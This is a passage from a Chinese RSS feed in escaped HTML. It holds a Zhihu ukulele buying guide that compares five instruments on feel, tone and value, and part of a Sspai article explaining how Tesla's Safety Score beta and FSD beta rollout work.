href=\"http://www.zhihu.com/question/319927345?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">去参加烈士陵园可以发朋友圈吗？</a><br>\n","link":"http://www.zhihu.com/question/489785273/answer/2147845424?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"初学者如何选购尤克里里？","date":"2021-10-08 03:54:36","description":"\n<h2>超全选购攻略：从300-10000音色试听，如何选择一把适合的尤克里里？</h2>\n<p>哈喽，大家好，我是丸子</p>\n<p>特别感谢 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/9f4fb22e0686450a11c6d5dc122e4888\" data-hash=\"9f4fb22e0686450a11c6d5dc122e4888\" data-hovercard=\"p$b$9f4fb22e0686450a11c6d5dc122e4888\">@知乎生活</a> 的邀请来做这次尤克里里的测评，我帮大家收集了市面上300-10000元区间的几款热门尤克里里，同时也在评论区选了几款呼声比较高有代表性的来做测评。让大家通过这篇文章，更加直观的了解影响一把琴价格的不同因素。</p>\n<p>在这篇测评里，我从入门级别到收藏级别给大家介绍来自五个不同品牌（UMA,TODO,POPULELE,ACE,KAMAKA），不同价位（300-5000），不同材质（桃花心，相思木，炭纤维）和工艺（合板，面单，全单）的五款尤克里里，我将从手感，音色和性价比三个方面来给出一个综合评分。并且给大家推荐一些不同价位，我自己使用过且觉得使用感还不错的尤克里里型号。</p>\n<p>其实已经不只是初学者尤克里里的选购了，更像是一个超全科普～</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ac1d87ec8fd4759c1d11a0114446f364_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-ac1d87ec8fd4759c1d11a0114446f364\" data-watermark-src=\"v2-82f990f5ee33de04b5d1cc6608820ae8\" data-private-watermark-src=\"v2-8f6f84dd820401e9d9d7947aeac4efcf\"></p>\n<p>这些都是在大理新采购的琴</p>\n<p>先介绍一下我自己。</p>\n<p>我是一个音乐旅行博主，大学期间就在琴行授课所以接触到了各个品牌的琴，后来自己出来也做过不少知名尤克里里品牌的代理商，再后来自己创业直接接触制琴师和渠道工厂，深入尤克里里的制作过程。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-12f55cf9054fdd647e050ee91ba2a10a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"481\" data-watermark=\"original\" data-original-src=\"v2-12f55cf9054fdd647e050ee91ba2a10a\" data-watermark-src=\"v2-83fde1c0efd953b6735928a73b72cd5e\" data-private-watermark-src=\"v2-0eda9b1d65e1bebfd135830cbb49c514\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-03e47aef80a8fb8f6631d6ebd1a78720_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"481\" data-watermark=\"original\" data-original-src=\"v2-03e47aef80a8fb8f6631d6ebd1a78720\" data-watermark-src=\"v2-ea0753f721458893f7a46d75a6e5da06\" data-private-watermark-src=\"v2-b0fbedb0ad8330d7ee77aafa93695b3f\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-8b1feab440d1ff9434861985fa94c56f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"481\" data-watermark=\"original\" data-original-src=\"v2-8b1feab440d1ff9434861985fa94c56f\" data-watermark-src=\"v2-ff1e010691634a3448544255f469c029\" data-private-watermark-src=\"v2-2e324d4dc25f3602030e09a24e6c7a24\"></p>\n<p>造访不同工厂拍的照片，了解制琴的各个环节</p>\n<p>在测评琴之前，我们需要先了解一下：</p>\n<h2><b>尺寸 – 影响音域和音色</b></h2>\n<p>- 尺寸越小，音域越窄，音色越尖锐 -</p>\n<p>- 尺寸越大，音域越宽，音色越沉稳 -</p>\n<p>- 简称： S型、C型、T型 -</p>\n<p>视频1：如何选择适合自己的尤克里里尺寸</p>\n<a href=\"https://www.zhihu.com/zvideo/1428025366253944832\">21/23/26,如何选择适合你的尤克里里尺寸？</a><p>视频2：一分钟搞清楚合板/面单/全单</p>\n<a href=\"https://www.zhihu.com/video/1429771213745336320\">合板单板傻傻分不清楚？</a><p>视频3：选琴三要素：预算，音色和功能性</p>\n<a href=\"https://www.zhihu.com/video/1429771360431833088\"></a><p><b>PS注意事项:</b></p>\n<p>1.尤克里里新琴走音是正常现象，通常会在演奏1-2周后稳定下来</p>\n<p>2.弦距指的是琴弦离品丝顶端的垂直距离，通常是以12品弦距作为标准。</p>\n<p>3.大家一定要警惕市面上一些品牌宣称自己12品能到2.5mm以下的，这种情况琴弦很容易打品，在演奏的时候有杂音。弦距只是影响手感的一部分因素，世界顶级尤克里里大神jake的尤克里里12品弦距在2.7mm，大家懂了吧。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4ec166e085732972bd90e7a84ef5b8ce_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1780\" data-rawheight=\"988\" data-watermark=\"original\" data-original-src=\"v2-4ec166e085732972bd90e7a84ef5b8ce\" data-watermark-src=\"v2-90195ed423e889104e21c7f82df18054\" data-private-watermark-src=\"\"></p>\n<p><b>先放测评结果和音色试听：</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f15eff7464b3b4233529260bc155384d_720w.jpg?rss\" data-caption=\"由于kamaka属于收藏级别，所以没放在对比表格里\" data-size=\"normal\" data-rawwidth=\"1474\" data-rawheight=\"556\" data-watermark=\"original\" data-original-src=\"v2-f15eff7464b3b4233529260bc155384d\" data-watermark-src=\"v2-a1aaec9c946c40a036ef4776d65ceab3\" data-private-watermark-src=\"\"></p>\n<a href=\"https://www.zhihu.com/video/1429771688330809344\">音色试听视频</a><p><b>第一款琴：Uma uk-03c（合板）</b></p>\n<p>价格：21寸320/23寸350</p>\n<p>Uma是一个老牌的台湾品牌，主打入门琴，以前是我所在的琴行的主打入门琴，我对他其实已经有些了解了。我们先简单的来看一下它的基本配置。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-52c8b344c34c23d0ca1d94565283f51f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1096\" data-rawheight=\"1160\" data-watermark=\"original\" data-original-src=\"v2-52c8b344c34c23d0ca1d94565283f51f\" data-watermark-src=\"v2-19fc8347994d6f6591bf8696e2be3804\" data-private-watermark-src=\"\"></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429768493621796864\"></a><p>这是一把23寸的桃花心合板琴，基本上这个价位的品牌琴配置都差不多。常规琴头，雕刻logo，logo还是很可爱的，琴弦用的自产碳素琴弦。</p>\n<blockquote>优点是：作为一个老牌，出品稳定，而且uma一直在入门琴这块市场做的还不错，品质不会有太大问题，合板琴也不太可能出现开裂这类的情况；<br> 缺点是：12品的弦距4mm，确实有点太高，对于初学者来说高把位按琴会比较费劲，高八度音准欠佳。</blockquote>\n<p><b>但大家一定要警惕市面上一些品牌宣称自己12品能到2.5mm以下的，这种情况琴弦很容易打品，在演奏的时候有杂音。</b>音色偏硬，合板琴开声会更慢一些，弹久了这个问题会变好。</p>\n<p>其实说到底，买品牌琴的一个保障是它的品质和服务，但在300+这个价位，像kaka25d，todo尼罗河，tom tuc-200基本配置不会差多少，大家如果是300的预算可以在以上几个型号里面选一款外观喜欢，有眼缘的琴就好了。</p>\n<p><b>推荐指数：3.5颗星</b></p>\n<p>同等价位同配置推荐：Tom tuc-200B / TODO尼罗河畔/kaka25d（插入商品）</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429768638581137408\"></a><a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429768753416839169\"></a><a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429768823830011904\"></a><p><b>第二款琴：TODO富士山下（面单）</b></p>\n<p>价格：23寸468 /26寸488</p>\n<p>和TODOD的合作源于2019年，我第一次收到他们的这款富士山下，自己弹了一段时间后觉得确实挺不错的，才有了后面更深入的交流，todo这款富士山下单板基本也成了我推荐概率最高的一把入门琴。</p>\n<p>我们先来看一下它的基本配置：</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-62ac96791b40b53386f02dbf6a63bf60_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"750\" data-rawheight=\"1131\" data-watermark=\"original\" data-original-src=\"v2-62ac96791b40b53386f02dbf6a63bf60\" data-watermark-src=\"v2-fa79a3f1e9c087d47a5d11907ea2add1\" data-private-watermark-src=\"\"></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429768948225552384\"></a><p>常规琴头，胡桃木镶嵌的logo（从2018年到现在更换过三个logo镶嵌的款式），金属质感旋钮，音孔珍贝包边，琴弦是日本进口的碳素琴弦，这个琴箱是一个特殊形，他的的大小比常规尤克里里琴箱胖一点，共鸣会更强烈，音孔周围有一圈珍贝包边，细节真的处理的很不错了。最特别的部分是专利设计的下琴码这个富士山小山了，这是我2019年看到的第一把比较有设计感的琴，从2018到现在这款琴的出品也很稳定了，12品弦距在2.7mm左右。</p>\n<blockquote>优点：有设计感/进口碳素琴弦/特殊琴体设计共鸣强/弦距感人 <br>缺点：小山下马横切面有激光印记</blockquote>\n<p>12品弦距能做到2.7mm的入门琴相当难得，指弹和弹唱都很舒服，价格在1000以内，另外这款琴还有一把云衫木的，浅色的，音色会比桃花心更亮一些，单板琴的优势就在于后期经常使用过后，会开声，声音会比现在更加顺滑。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d7f0cf2fffd701cb6415d37120274810_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"6123\" data-rawheight=\"4082\" data-watermark=\"original\" data-original-src=\"v2-d7f0cf2fffd701cb6415d37120274810\" data-watermark-src=\"v2-d0057e457382f052f383ab75f33fed2e\" data-private-watermark-src=\"\"></p>\n<p><b>推荐指数：5颗星。</b></p>\n<p>性价比超高，预算充足的话可以换成TODO的TUD-520的相思木面单，售价680。相比起买一把300+的合板，不如加100多冲个单板，如果能够坚持练习一年半的话，就可以再入手一把不同尺寸的全单进阶琴的。</p>\n<p>500-1000区间推荐</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429769151342206976\"></a><a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429769678071320576\"></a><p><br></p>\n<p><b>第三款琴：populele2</b></p>\n<p>智能尤克里里真的智能吗？</p>\n<p>炭纤维到底是什么什么材质？适合用作乐器吗？</p>\n<p>价格：599</p>\n<p>测评视频：</p>\n<a href=\"https://www.zhihu.com/video/1429769770966773761\">智能尤克里里值不值得买？</a><p>这把琴很明显，针对的是完全新手小白。</p>\n<p>我们先从乐器层面来讲一下这把琴的优缺点</p>\n<blockquote>优点：外观时尚靓丽，不会有面板开裂刮手等问题 缺点：弦距特别高，12品弦距4.0mm，按弦费劲，琴弦比较硬。声音延续性弱。</blockquote>\n<p><img src=\"https://pic4.zhimg.com/v2-72cc1c4c0e5de195d98e0c895b6cf160_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"2768\" data-watermark=\"original\" data-original-src=\"v2-72cc1c4c0e5de195d98e0c895b6cf160\" data-watermark-src=\"v2-5da6b76bccdd8ce4615203db4941390c\" data-private-watermark-src=\"\"></p>\n<p>所以单纯作为一把乐器来说，我的结论是性价比很低。</p>\n<p>那我们再来看一下，这把智能尤克里里是否足够智能？</p>\n<p>首先，智能尤克里里当然要配备app使用，先来看一下这个app界面：这个工具区还是挺有用的，不过呢，哪怕你不是populele也可以用这个app，连接性并不大。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-78aa3a651efa30bec1cdd4ff05970673_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2436\" data-rawheight=\"1125\" data-watermark=\"original\" data-original-src=\"v2-78aa3a651efa30bec1cdd4ff05970673\" data-watermark-src=\"v2-91dd553ec5f6bf2e2921ba6d08638411\" data-private-watermark-src=\"\"></p>\n<p>它表现智能的点好像在于你连接上蓝牙以后，指板上面会亮灯。然后在你要弹奏某个和弦的时候就亮起某个和弦的灯。</p>\n<p>听起来很合理，但这却是我最想吐槽的一点。</p>\n<p>因为你在玩app内的学习游戏的时候，看屏幕的时候，没法看指板，看指板的时候又没法看屏幕。尤其是对比和弦不熟悉的新手小白来说。所以这个亮灯很鸡肋。</p>\n<p>更不合理的一点是他居然没有音点！而且其实真正的炭纤维这种材质成本是很高的，之所以市面上的乐器都称自己是复合碳纤维是因为他们的主要成分也不是炭纤维。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-44abb9972a6abb2762ad755c9c512fe5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"2768\" data-watermark=\"original\" data-original-src=\"v2-44abb9972a6abb2762ad755c9c512fe5\" data-watermark-src=\"v2-a7deb18f7c986e0a1c16eaed2902c159\" data-private-watermark-src=\"\"></p>\n<p>但是！还是有优点的。</p>\n<p>大家看一下，我是把这个app上面的所有新手课程都学完了才来跟大家分享心得的。</p>\n<blockquote>优点1:app新手课程安排的很合理，讲的很细<br>优点2：工具区的调音器，节拍器和和弦表都特别实用，<br>优点3:游戏化的练习方式很适用于小朋友，歌曲库也有大量曲谱<br>优点4:指板亮灯会帮助大家记住和弦</blockquote>\n<p>大家可能发现了，以上所有的优点其实除了第四点以外前三点都是普通木质尤克里里也可以搭配使用的，所以我的结论就是。</p>\n<blockquote>1.琴好看，但不好弹，音质一般<br>2.app好用，且适用于所有尤克里里。</blockquote>\n<p><b>推荐指数：3颗星</b></p>\n<p>以上就是针对populele2的测评</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429770019760271360\"></a><p>拿火家的炭纤维尤克里里也比较火，我没有用过他们家的尤克里里，但是用过吉他后来二手出了。整体感受就是琴还可以就是性价比不高，包装宣传上有夸大尤其是那些特殊功能性的视频。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429770421482295296\"></a><p><br></p>\n<p><b>第四款琴：ACE A65(泰国相思木全单)</b></p>\n<p>价格：23寸3500/26寸3750</p>\n<p>ACE 是大陆目前做的最好的中高端尤克里里品牌，琴的价格都在2500以上，出的都是全单琴。很多大神的选择，出品质量比较高。</p>\n<p>我很多年前买过一把ACE d31, 一把桃花心全单，我看了一下现在价格是2600，但因为大多数人这个价格都会宁愿买一把相思木全单了，所以现在买这款的人少了，但说实话，我这次测评玩a65以后，甚至觉得更喜欢我原来那吧d31，这个就又涉及到木材音色的问题了，桃花心的中频音色是很出彩的。所以再次强调音色没有好坏之分，纯属个人喜好。</p>\n<p>那么这次测评的这把是ACE销量最高的泰国相思木全单A65</p>\n<p>我们先来看一下它的基本配置：（图片）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5a07f06aaebbfc308927f2873479b027_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"750\" data-rawheight=\"861\" data-watermark=\"original\" data-original-src=\"v2-5a07f06aaebbfc308927f2873479b027\" data-watermark-src=\"v2-53e5a7c6fc7445b9e407b52bbadfcedf\" data-private-watermark-src=\"\"></p>\n<p>因为我是内部拿的琴，所以木纹有挑选过，不是每一把a65都可以选到这么漂亮的相思木木纹。我们直观的聊一下3000+的琴和百元琴的几大差别：</p>\n<p>首先百元琴能满足的千元琴一定能满足。</p>\n<p>在这个基础上，它的工艺是亮光漆面十分美观，另外最重要的一点是百元琴基本上都会有八度音不准的问题，简单的理解就是低把位音准没问题，但是12品（即高八度）的标准音可能会有跑音的情况，这个音准受品丝的位置，琴弦张力，琴头和琴颈仰角的角度的影响，比较考验制琴工艺。</p>\n<p>批量生产的琴为了节省人工成本往往不会有专门的调音师傅专门来校准八度音的音准。</p>\n<p>主要也是由于绝大多数的初学者，不太会用到高把位的弹奏，以及一点点音的偏差在不使用专业调音器的情况下，你们是听不出来的。</p>\n<p>总结一下</p>\n<p><img src=\"https://pic2.zhimg.com/v2-8eef18a029263d1fa6b1fff9d32146c4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"2768\" data-watermark=\"original\" data-original-src=\"v2-8eef18a029263d1fa6b1fff9d32146c4\" data-watermark-src=\"v2-395f6ad574384392605a711f737a1885\" data-private-watermark-src=\"\"></p>\n<blockquote>优点是：外观惊艳，工艺/音准和手感<br>缺点：亮光漆的琴往往开声会慢一些，刚开始弹奏的时候我会感觉声音闷闷的，后面越弹越好听。相思木要格外注意琴的保养。</blockquote>\n<p>另外我收到这把琴弦距有点高，大家可以在购买前跟卖家交代一下弦距控制在2.3-2.7之间。</p>\n<p><b>推荐指数：5颗星</b></p>\n<p>同配置推荐：艳阳BS21T</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429770717433303040\"></a><p><br></p>\n<h3><b>第五款琴：KAMAKA HP1</b></h3>\n<p><b>10000块？还买不到？一把尤克里里凭什么卖那么贵？</b></p>\n<p>第五把琴我们要聊的就是收藏级了，你可能会觉得这把一万块钱的尤克里里已经很贵了，但在kamaka里面还只是入门级。首先我们要认识尤克里里界的奢侈品品牌：4K1G，K分别是Kamaka、Kanile’a、KoAloha和Ko’olau，G是G-String。价格都在万元以上。</p>\n<p>为了理解一把尤克里里为什么卖的这么贵，我们首先要知道：乐器不是生活的必需品，而是生活的奢侈品。它已经超出了我们日常生活所必需的范围，是精神层次的追求。</p>\n<p>我们无法用它的使用价值去给一个乐器定价。</p>\n<p>除此之外，还有亮点更实际的解释他为什么那么贵：</p>\n<blockquote>1.夏威夷相思木作为一种极其稀少的木材，不能出口原料，只能出口成品工艺品<br>2.夏威夷相思木是最传统的尤克里里制琴木材<br>3.kamaka是全世界公认的尤克里里奢侈品牌，百年品牌的品牌溢价，有一定收藏价值</blockquote>\n<p>综上所述，你应该能理解它为什么能卖到这么贵的价格了。</p>\n<p>那我们再来看一下这把hp1的基本配置：</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429774222713909248\"></a><p><img src=\"https://pic1.zhimg.com/v2-021cc049f2b73596376dc53690567e58_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1022\" data-rawheight=\"592\" data-watermark=\"original\" data-original-src=\"v2-021cc049f2b73596376dc53690567e58\" data-watermark-src=\"v2-a12046b6dd3e4811880e2f7531ac351e\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-d770ad98e3ed8fce804e9941195a6571_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"2768\" data-watermark=\"original\" data-original-src=\"v2-d770ad98e3ed8fce804e9941195a6571\" data-watermark-src=\"v2-7e3517694debcf253ea8bd7e18c4a7c4\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-5b3ab40e6e01a4498e3c557715349558_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"2768\" data-watermark=\"original\" data-original-src=\"v2-5b3ab40e6e01a4498e3c557715349558\" data-watermark-src=\"v2-8497bb22cf407af41fde2312688914c2\" data-private-watermark-src=\"\"></p>\n<p>值得一提的是，这种菠萝桶型的设计就是由kamaka家族发明的。</p>\n<p>音色：卡玛咖给我的感觉是音色比较均衡，尽管这把hp1是21寸，但是共鸣很棒，手感各方面没有什么毛病可挑的，第一感觉很朴素，一把哑光相思木全单，但越弹越有味道，开声以后音色会比现在好更多。</p>\n<p>最后感谢<b>@上海星光音乐教室</b> 刘宗立老师提供的这把kamaka hp1给我做测评，需要买进阶琴的同学也可以搜索在各大平台搜索 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/8ab642b044ba6820cf27655a4fa2d626\" data-hash=\"8ab642b044ba6820cf27655a4fa2d626\" data-hovercard=\"p$b$8ab642b044ba6820cf27655a4fa2d626\">@刘宗立</a> UKULELE 去寻求专业咨询购买一把属于自己的高端琴。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-aea6a3494b0c69d8db0acb524140a8d8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"2768\" data-watermark=\"original\" data-original-src=\"v2-aea6a3494b0c69d8db0acb524140a8d8\" data-watermark-src=\"v2-a58b45ffc57628a76caf7fa1cf7dfab9\" data-private-watermark-src=\"\"></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429774317081542656\"></a><p>那么以上就是关于尤克里里这五把琴的测评。</p>\n<p>最后总结一下，如何选择一把尤克里里。</p>\n<blockquote>首先：定预算（尤克里里建议购买300以上的品牌琴。在2000元以内的尤克里里都是一分钱一分货，在预算范围内买最贵的。<br>其次：听音色（音色没有好坏之分，不管是相思木的清脆，桃花心的温润还是玫瑰木或者云杉。）<br>最后：功能性（你是用于什么场合来选择它的配置和尺寸。）</blockquote>\n<p>关于买完琴 以后更多尤克里里学习上你可能会遇到的问题，可以关注我哦。</p>\n<a href=\"https://www.zhihu.com/zvideo/1371844543160119296\">尤克里里初学者最常遇到的五个问题/5 TIPS FOR BEIGNNER.</a>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wan-zi-47-57?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">丸子里里</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/24107519/answer/2159812708?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">101 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/318288635?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">尤克里里怎么卖啊，初学者大概啥都不懂，然后想买着玩？</a><br><a href=\"http://www.zhihu.com/question/310071952?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">初学者买350元左右的尤克里里怎么样？300-400是火烧棍吗？</a><br>\n","link":"http://www.zhihu.com/question/24107519/answer/2159812708?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"靠「安全评分」进军汽车保险？特斯拉要反过来教司机开车","date":"2021-10-08 03:30:03","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>9 月 25 日，特斯拉在美国本土同时推送 Tesla OS v2021.32.22 和特斯拉 App v4.1 版本更新，<strong>更新了「FSD 完全自动驾驶 Beta 版申请按钮」和「安全评分 Beta 版」两个功能。</strong>基于这两个功能，特斯拉在数据驱动业务的维度向前跨越了一大步。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/0b08760a6dbe9bb6ea1d8e60f2bf08c1\" alt=\"图片\"></figure><p><br>简单来说，美国地区选装了 FSD 的特斯拉车主可以在系统更新至 2020.32.22 后点击「申请完全自动驾驶能力 Beta 版」，系统内置的「特斯拉保险计算器」会运行「安全评分 Beta 版」，<strong>待系统连续 7 天认定驾驶员驾驶习惯安全可靠后，该车即可收到 FSD Beta 的推送更新。 </strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/d632250b914cdfeb6b0dc2facb4a56f7\" alt=\"图片\"></figure><p><br>从 FSD 的全栈算法、公测用户的运营扩张乃至衍生的特斯拉 UBI（Usage-based insurance）车险，这一整个闭环的业务，<strong>特斯拉全部转向了基于数据驱动的机器学习。由此，特斯拉开启了全面升维的竞争。 </strong></p>\n<h2>安全评分 Beta 版</h2>\n<p>之所以将「安全评分 Beta 版」放在开头介绍，是因为无论是「FSD 完全自动驾驶 Beta 版申请按钮」还是「特斯拉保险」，都是以「安全评分」为根基的业务。那么，什么是「安全评分」？ </p>\n<p>据特斯拉的介绍：</p>\n<blockquote>\n<p>「安全评分」根据 5 个与安全相关的指标对特斯拉车主的驾驶行为进行评估，特斯拉将基于这些数据预测当事车主的驾驶习惯在未来驾驶车辆发生碰撞的可能性。</p>\n<p>「安全评分」的目的是为驾驶员提供透明度和对其驾驶行为的反馈。「安全评分」介于 0 和100 之间，分数越高表明驾驶越安全，<strong>特斯拉认为绝大多数司机的评分应当 ≥ 80 分。</strong></p>\n</blockquote>\n<p>那 5 个「安全相关的指标」分别是什么呢？驾驶员对车辆的操作控制无外乎横向和纵向控制两大维度，其中横向控制主要通过往左右打方向盘来实现，纵向控制通过加速和制动踏板实现。特斯拉「安全评分」的 5 个指标也逃不出这三大执行操作：</p>\n<p><strong>每千英里前方碰撞预警触发率</strong>（下记为 A），一个冗长但并不难理解的名词，每驾驶 1000 英里，驾驶员未介入而特斯拉 Autopilot 系统认为可能发生碰撞，从而触发「前方碰撞预警」的次数。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/a144fc5e0750d5e02661767de2c343de\" alt=\"图片\"></figure><p><br><strong>急刹车</strong>（下记为 B） ，一个比值。特斯拉的定义是在驾驶行程中，刹车减速度超过 0.3 g（相当每过一秒钟车速下降超过 6.7 mph 即 10.78 km/h），除以刹车减速度超过 0.1 g（相当于每过一秒钟车速下降超过 2.2 mph 即 3.54 km/h）的比值。 </p>\n<p><strong>猛转向</strong>（下记为 C），同样是一个比值。特斯拉的定义是在驾驶行程中，车辆左/右加速度超过 0.4 g（相当于每过一秒钟车辆向左/右的速度增加超过 8.9 mph 即 14.32 km/h），除以车辆左/右加速度超过 0.2 g（相当于每过一秒钟车辆向左/右的速度增加超过 4.5 mph 即 7.24km/h）的比值。 </p>\n<p><strong>不安全跟车</strong>（下记为 D），D 是一个动态值。Autopilot 根据本车速度、前车速度和两车间的距离判断。计算方法为当前车突然刹停，驾驶员做出反应并刹停所需的时间长度。D 的定义为反应时间低于 1 秒除以反应时间低于 3 秒的比值。此外，D 只有车速在 50 mph（80.47 km/h）才会被记录。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/c5aae552c5c812c73aa44de92a170f2f\" alt=\"图片\"></figure><p><strong>强制退出 Autopilot</strong>（下记为 E），特斯拉车主都知道，Autopilot 会在连续警告三次均得不到驾驶员的响应后退出，当驾驶员双手脱离方向盘或分心驾驶后，系统将发出警告。E 的定义是 5 个指标中最为简单的一个：如果驾驶行程中 Autopilot 出现强制退出，记为 1，否则记 0。 特斯拉有一个 PCF（Predicted Collision Frequency，预测碰撞频率）计算公式，将上述 A、B、C、D、E 五个数值计入如下公式，即可得出 PCF 值。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/6c433eafcd330789b7dadf6b367d4c87\" alt=\"图片\"></figure><blockquote><p><br>安全评分 = 115.382324 - 22.526504 × PCF </p></blockquote>\n<p>你一定想问，这 8 个精确到小数点后 6 位的数都是怎么来的。特斯拉表示，<strong>当前公式都是基于 60 亿英里车队数据的统计模型得出的。</strong> </p>\n<p>到这里，其实你已经能看出，这个「安全评分」并不简单。基于已有的 60 亿英里车队数据，准确地分辨出哪些车主的驾驶习惯良好，听上去就不是个轻松的事情，事实上，从首批车主的体验反馈看，连特斯拉也低估了 Ta 的难度。 </p>\n<h2>FSD 内测规模如何有序扩张</h2>\n<p>自 2020 年 10 月 21 日特斯拉首次公测 FSD Beta 至今，围绕特斯拉 FSD 一个相当广泛的质疑是，<strong>FSD Beta 公测的车队规模一直保持在 2000 辆上下。</strong>没有进入美国更多的州，也没运行在更多的 FSD 车型上。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/7a73873e93befc0d40184f897076b672\" alt=\"图片\"></figure><p>这和大众对特斯拉 FSD 的预期相去甚远，世界不需要另一个可扩展性严重受限的自动驾驶系统。过去 5 年来，Waymo、Cruise 们都没能带给我们惊喜，<strong>而特斯拉几乎是唯一一家直到 2021 年仍然「逢自动驾驶必谈 Scalability」的主流自动驾驶玩家。</strong></p>\n<p>但在质疑背后，特斯拉一直在以近乎疯狂的效率迭代着 FSD Beta 的全栈算法，不夸张地说，<strong>从 2020 年 10 月至今，超 20 个大小版本迭代后的 FSD Beta 10.1 已经发生了脱胎换骨的变化。</strong>这一点从 8 月 19 日的特斯拉 AI Day 大会亦可看出端倪。 </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/article/7d3e7651383db74abcf3e50fb29fe511\" alt=\"图片\"></figure><p><br>今天，FSD Beta 进阶到了一个尴尬的境地：一方面，特斯拉需要更多、更丰富的场景，以加快加速算法的迭代，这意味着更大规模的公测车队；另一方面，FSD Beta 虽然已经取得了巨大的改进，<strong>但 Ta 还不够好，至少不足以放心地让特斯拉将之推送到每一辆 FSD 